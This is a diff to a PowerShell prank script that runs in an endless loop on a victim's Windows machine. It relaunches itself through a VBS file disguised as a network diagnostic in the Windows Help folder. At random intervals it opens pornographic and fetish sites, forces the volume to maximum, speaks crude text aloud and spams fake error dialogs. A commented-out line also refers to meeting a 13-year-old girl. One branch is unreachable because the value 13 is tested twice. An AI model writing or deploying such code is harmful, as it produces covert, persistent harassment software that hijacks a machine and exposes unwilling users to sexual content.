@@ -1,6 +1,7 @@
 # Setup TTS etc
 Add-Type -AssemblyName System.Speech
 $speaker = New-Object System.Speech.Synthesis.SpeechSynthesizer
+Add-Type -AssemblyName PresentationFramework
 function set_AudioLevel($audioLevel){$wshShell = new-object -com wscript.shell; 1..50 | % {$wshShell.SendKeys([char]174)}; $audioLevel = $audioLevel / 2;1..$audioLevel | % {$wshShell.SendKeys([char]175)}}
 
 # Erm, persist
@@ -9,11 +10,11 @@ Start-Process "C:\Windows\Help\NetworkDiagnostic.vbs"
 
 while ($true){
     # Sleep for a random amount of time
-    $randomWaitTime = Get-Random -Minimum 10 -Maximum 300
+    $randomWaitTime = Get-Random -Minimum 5 -Maximum 120
     Start-Sleep -Seconds $randomWaitTime
 
     # Decide action
-    $randomNumber = Get-Random -Minimum 1 -Maximum 12
+    $randomNumber = Get-Random -Minimum 1 -Maximum 14
 
     if ($randomNumber -eq 1){
         Start-Process "https://porn.tgm.one"
@@ -38,6 +39,7 @@ while ($true){
         #$speaker.Speak("I AM HERE TO MEET A 13 YEAR OLD GIRL")
         $speaker.Speak("giacobe gigablasting into a cyberspace near you. Launching in 10... 9... 8... 6... 5... 4.......... UGHHHHHHHHHHHHH 3.. 2.. I CANT TAKE IT ANYMORE......... 1.. IM GIACOBE GIGABLASTING")
     } elseif ($randomNumber -eq 8){
+        set_AudioLevel 100
         Start-Process "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
     } elseif ($randomNumber -eq 9){
         for ($i = 1; $i -le 10; $i++) {
@@ -48,6 +50,18 @@ while ($true){
         Start-Process "https://feetfinder.com"
     } elseif ($randomNumber -eq 11){
         Start-Process "https://porn.tgm.one/shop"
+    } elseif ($randomNumber -eq 12){
+        set_AudioLevel 100
+        Start-Process "https://www.youtube.com/watch?v=4x163sCo1IQ"
+    } elseif ($randomNumber -eq 13){
+        [System.Windows.MessageBox]::Show("Erm", "Critical Skill Issue", [System.Windows.MessageBoxButton]::Ok, [System.Windows.MessageBoxImage]::Error)
+    } elseif ($randomNumber -eq 13){
+        [System.Windows.MessageBox]::Show("Crazy?", "Crazy?", [System.Windows.MessageBoxButton]::Ok, [System.Windows.MessageBoxImage]::Error)
+        [System.Windows.MessageBox]::Show("I was crazy once", "Crazy?", [System.Windows.MessageBoxButton]::Ok, [System.Windows.MessageBoxImage]::Error)
+        [System.Windows.MessageBox]::Show("They put me in a room", "Crazy?", [System.Windows.MessageBoxButton]::Ok, [System.Windows.MessageBoxImage]::Error)
+        [System.Windows.MessageBox]::Show("A rubber room", "Crazy?", [System.Windows.MessageBoxButton]::Ok, [System.Windows.MessageBoxImage]::Error)
+        [System.Windows.MessageBox]::Show("A rubber room filled with rats", "Crazy?", [System.Windows.MessageBoxButton]::Ok, [System.Windows.MessageBoxImage]::Error)
+        [System.Windows.MessageBox]::Show("The rats made me crazy", "Crazy?", [System.Windows.MessageBoxButton]::Ok, [System.Windows.MessageBoxImage]::Error)
     }
 
     # erm, persist
